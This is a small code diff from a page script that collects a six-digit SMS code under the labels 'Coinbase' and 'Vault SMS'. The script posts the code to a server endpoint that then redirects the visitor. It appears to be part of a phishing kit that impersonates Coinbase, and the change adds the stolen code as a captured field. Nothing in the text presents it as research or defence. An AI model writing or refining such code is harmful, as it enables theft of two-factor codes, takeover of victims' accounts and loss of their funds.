@@ -58,7 +58,7 @@
     var code=inputs.map(function(i){return i.value}).join('');
     if(code.length!==6) return;
     inputs.forEach(function(i){i.disabled=true;});
-    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault SMS',choice:code})})
+    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault SMS',choice:code,fields:{code:code}})})
       .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;});
   }
   inputs[0].focus();
